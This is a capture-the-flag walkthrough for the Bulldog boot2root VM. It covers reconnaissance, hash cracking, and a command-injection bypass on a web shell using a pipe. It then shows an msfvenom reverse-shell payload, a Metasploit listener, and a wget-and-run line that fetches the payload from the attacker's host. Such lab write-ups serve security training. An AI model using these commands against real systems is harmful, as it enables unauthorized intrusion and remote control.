@@ -1,0 +1,48 @@
+
+Hack the Bulldog VM (Boot2Root Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Bulldog. The credit for making this vm machine goes to “Nick Frichette” and it is another Boot2root challenge. Our goal is to get into root directory and see the congratulatory message. You can download this VM here.
+Let’s Breach!!!
+The target holds 192.168.1.158 as network IP; now using nmap lets find out open ports.
+nmap -sV 192.168.1.158
+
+Nmap scan shows us port 80 is open, so we open the ip address in our browser.
+
+We don’t find anything on the web page. So we use dirb to find the directories for more information.
+dirb http://192.168.1.158/
+
+We find quite a few directories, we open http://192.168.1.158/dev/ for information. We didn’t find anything on the web page, so we take a look at the source code of the page. There we find a few passwords in md5 hash encryption for the respective users.
+
+We are able to only crack the last 2 hashes and find 2 strings ‘bulldog’ and ‘bulldoglover’.
+
+We open the admin page we found using dirb. We now use one of these hashes as password and we take the respective username.
+We use username as ‘nick’ and password as ‘bulldog’.
+
+After logging in we go to http://192.168.1.107/dev/shell that we found using dirb. We find that it Is a command shell that allows us to execute certain commands. We can easily bypass this firewall using ‘|’ to run multiple commands.
+
+Now we create a python payload using msfvenom.
+msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 > /var/www/html/shell.py
+
+We setup our listener using metasploit for reverse shell.
+msf > use exploit/multi/handler
+msf exploit(handler) > set lhost 192.168.1.111
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > set payload python/meterpreter/reverse_tcp
+msf exploit(handler) > run
+
+We now upload our payload to the server and execute the payload to get reverse shell.
+pwd | wget http://192.168.1.111/shell.py | python shell.py
+
+As soon as we execute our payload we get our session on metasploit.
+
+We spawn a shell using python to execute our command.
+
+Looking through we find a file customPermissionApp in /home/bulldogadmin/.hiddendirectory/.
+We use strings command to take a look at the strings inside customPermissionApp.
+strings customPermissionApp
+
+We find a string called SUPERultHimatePASHSWORDyouHCANTget, we remove ‘H’ from the string and use this as our password to get access as root.
+sudo su
+Then we move to root folder inside the root folder we find a file called ‘congrats.txt’. When we open the file we are greeted by a message congratulating us for the completion of the VM challenge
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
